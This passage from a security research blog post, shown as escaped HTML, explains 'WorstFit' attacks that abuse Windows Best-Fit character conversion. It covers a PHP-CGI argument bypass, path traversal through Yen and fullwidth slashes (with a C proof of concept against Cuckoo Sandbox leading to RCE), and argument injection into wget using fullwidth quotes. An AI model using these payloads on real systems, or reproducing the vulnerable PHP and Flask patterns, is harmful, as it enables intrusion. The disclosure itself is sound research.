class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decoded_qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* skip leading spaces */&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;-&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;skip_getopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The patch worked well, and no one broke it for the past 12 years. However, while reviewing the patch, we couldnâ€™t help but feel that this blacklist approach seemed weak. After some quick fuzzing, we discovered a simple bypass: appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; to the query string effortlessly!&lt;/p&gt;

&lt;p&gt;As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior, which explains how the bypass works.&lt;/p&gt;

&lt;p&gt;This is the first time weâ€™ve encountered the term â€œBest-Fitâ€. We found it super interesting, which motivated us to take a deeper look.&lt;/p&gt;

&lt;h3 id=&quot;-filename-smuggling&quot;&gt;ğŸ”¥ Filename Smuggling&lt;/h3&gt;

&lt;p&gt;The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either &lt;strong&gt;â€/â€ (0x2F)&lt;/strong&gt; or &lt;strong&gt;â€\â€ (0x5C)&lt;/strong&gt;, such as the currency symbol &lt;a href=&quot;https://en.wikipedia.org/wiki/Won_sign&quot;&gt;Yen (Â¥)&lt;/a&gt;, and &lt;a href=&quot;https://en.wikipedia.org/wiki/Yen_and_yuan_sign&quot;&gt;Won (â‚©)&lt;/a&gt; used in Japanese and Korean Code Pages, as well as the &lt;a href=&quot;https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)&quot;&gt;fullwidth&lt;/a&gt; version of the (back-)slash in most Code Pages. You can check the affected characters and Code Pages on our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x2f&quot;&gt;Characters mapped to â€œ/â€ (0x2F)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to â€œ\â€ (0x5C)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getcwd&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindFirstFileA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/findfirst-functions?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findfirst*&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetFullPathNameA&lt;/code&gt;&lt;/a&gt;, â€¦&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF0F&quot;&gt;U+FF0F&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼¼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Â¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;â‚©&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Letâ€™s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d8.exe&lt;/code&gt;) uses the ANSI API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA()&lt;/code&gt; to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/4.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;â†‘ Unintended file access on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Another case is the implementation of mruby &lt;a href=&quot;https://github.com/mruby/mruby/blob/3.3.0/mrbgems/mruby-dir/src/dir.c#L23&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;&lt;/a&gt; on Windows, the function relied on the ANSI version of CRT (C Runtime Library) &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_getcwd()&lt;/code&gt;&lt;/a&gt; to retrieve the current directory. This also means that we can pollute that functionâ€™s return value, leading to Path Traversal, too!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/5.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;â†‘ Pollute the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Of course, the above cases are still bugs instead of real vulnerabilities. Letâ€™s take a look at some real-world cases!&lt;/p&gt;

&lt;h4 id=&quot;-case-study---path-traversal-to-rce-on-cuckoo-sandbox&quot;&gt;â¤ Case Study - Path Traversal to RCE on Cuckoo Sandbox&lt;/h4&gt;

&lt;p&gt;Before diving into the vulnerability, itâ€™s important to discuss Python first because it plays a significant role in this case! Conceptually, Python allows strings to be represented in two different types: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unicode&lt;/code&gt; in Python 2, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes&lt;/code&gt; in Python 3.&lt;/p&gt;

&lt;p&gt;To support both string representations, the implementation of filesystem access used a structure field to determine whether a target path was wide or narrow. If the string was narrow, the corresponding ANSI API was used to process the path, making it susceptible to the Best-Fit behavior. Although &lt;a href=&quot;https://peps.python.org/pep-0529/&quot;&gt;PEP 529&lt;/a&gt; later standardized the filesystem encoding on Windows to UTF-8, earlier versions â€” such as Python 2 and Python 3 (prior to version 3.6) â€” remained vulnerable to WorstFit attacks.&lt;/p&gt;

&lt;p&gt;With the above context in mind, letâ€™s have our first target â€” &lt;a href=&quot;https://cuckoosandbox.org/index.html&quot;&gt;Cuckoo Sandbox&lt;/a&gt;, a well-known automated malware analysis platform. As one of the few open-source solutions for malware analysis in early days, it was the go-to choice for organizations building their own platforms, and for malware researchers seeking to extend its functionality. However, since Cuckoo has not been actively maintained for many years, the latest official version still relies on Python 2.7, which exposes it to our WorstFit Attack!&lt;/p&gt;

&lt;p&gt;Cuckoo consists of two main components: the &lt;strong&gt;Cuckoo Host&lt;/strong&gt; and the &lt;strong&gt;VM Cluster&lt;/strong&gt;. The uploaded samples are isolated within virtual machines to ensure they do not affect the Cuckoo. The components use a dedicated channel to synchronize the behaviors such as captured network packets, dropped files, and output logs with their own mechanism. However, since the Cuckoo Host is written in Python and relied on an outdated version, a dropped file with a Unicode filename can traverse the path on the Cuckoo Host!&lt;/p&gt;

&lt;p&gt;Hereâ€™s a simple Proof of Concept:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;AAAA\u00a5..\u00a5..\u00a5..\u00a5..\u00a5..\u00a5conf\u00a5cuckoo.conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_ALWAYS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the analysis has finished, users can view the logs and dropped files generated by the malware through the web interface. An attacker can trigger a file operation on Python by clicking the download button. The Cuckoo Host then processes a translated path, containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; and sends sensitive data to the attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The attacker can then download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuckoo.conf&lt;/code&gt;, and gathered several sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-argument-splitting&quot;&gt;ğŸ”¥ Argument Splitting&lt;/h3&gt;

&lt;p&gt;We can also exploit the WorstFit behavior in command line parsing by manipulating the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. With this trick, even if you can control just a small part of an argument, thatâ€™s more than enough to inject as many arguments as you want!&lt;/p&gt;

&lt;p&gt;This time, weâ€™re zeroing in on characters that map to either a double quote (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, 0x22) or a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;, 0x5C). Once again, fullwidth characters come in handy here, and when it comes to backslashes, those currency symbols we talked about earlier make a comeback!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x22&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandlineA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-language/main-function-and-program-execution?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼‚&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF02&quot;&gt;U+FF02&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼¼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Â¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;â‚©&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Letâ€™s circle back to the piece of code we discussed earlier. How might this seemingly simple snippet fail, and more importantly, how could an attacker exploit it?&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer is quite simple. If an attacker provides the input: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼‚ --use-askpass=calc ï¼‚&lt;/code&gt;
It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;

&lt;p&gt;At this point, you might be thinking, &lt;em&gt;â€œOh, itâ€™s PHP messing up again, isnâ€™t it? I know PHP alwaysâ€¦â€&lt;/em&gt; But nope â€“ even switching to &lt;strong&gt;Node.js&lt;/strong&gt;, &lt;strong&gt;Rust&lt;/strong&gt;, or &lt;strong&gt;Python&lt;/strong&gt; doesnâ€™t save you. Hereâ€™s an example in Python, and the same input works like a charm â€“ this time on the latest version of Python, not just older ones:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/fetch&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wget&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://example.tld/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, is this wgetâ€™s problem? Well, spoiler alert: yes, itâ€™s part of the issue, but it doesnâ€™t stop there. The same trick works on other executables like &lt;strong&gt;openssl.exe&lt;/strong&gt;, &lt;strong&gt;tar.exe&lt;/strong&gt;, &lt;strong&gt;java.exe&lt;/strong&gt;, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools. So, how does it happen?&lt;/p&gt;

&lt;p&gt;Letâ€™s back to our payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼‚ --use-askpass=calc ï¼‚&lt;/code&gt;. I guess now some of you might still be wondering: &lt;em&gt;Wait, how does a simple double quote bypass the escaping? What exactly does it escape, then?&lt;/em&gt; Well, first of all, these arenâ€™t just regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) â€” theyâ€™re actually &lt;strong&gt;fullwidth double quotes&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) ğŸ˜‰. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes (&lt;a href=&quot;https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22&quot;&gt;ğŸ”&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;But still, why can these double quotes alter the arguments?&lt;/p&gt;

&lt;p&gt;Firstly, on Windows, the &lt;strong&gt;entire command line&lt;/strong&gt; is passed as a single string to the spawned process, leaving it up to the executable to parse. Thatâ€™s why the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&quot;&gt;CreateProcess API&lt;/a&gt; accepts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpCommandLine&lt;/code&gt; parameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out &lt;a href=&quot;https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN&quot;&gt;this article&lt;/a&gt; by David Deley.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Secondly, because the command line string is stored internally in wide character (Unicode) format, retrieving its ANSI string version involves Windows using the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;&lt;/a&gt; API.  Which of course the Best-Fit feature is applied during this process, potentially altering the command line in subtle but impactful ways.&lt;/p&gt;

&lt;p&gt;But actually, there isnâ€™t a single â€œstandardâ€ way to parse the command line on Windows. However, the parsing convention typically adheres to the rules of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/cpp/main-function-command-line-args#parsing-c-command-line-arguments&quot;&gt;CRT command-line parsing&lt;/a&gt;. In practice, most developers use either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt; or CRT standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main(...)&lt;/code&gt; to handle command-line arguments, so Iâ€™d say we can pretty much treat this as the standard. The key characters involved in the parsing process include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Tabs (0x09) and spaces (0x20)&lt;/strong&gt;: Used to separate arguments (except when in quote mode).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/strong&gt;: Toggles the quote mode to treat spaces as part of the argument.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/strong&gt;: Escapes double quotes and backslashes when used in a specific sequence.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These conventions form the foundation of how arguments are interpreted and passed to executables.&lt;/p&gt;

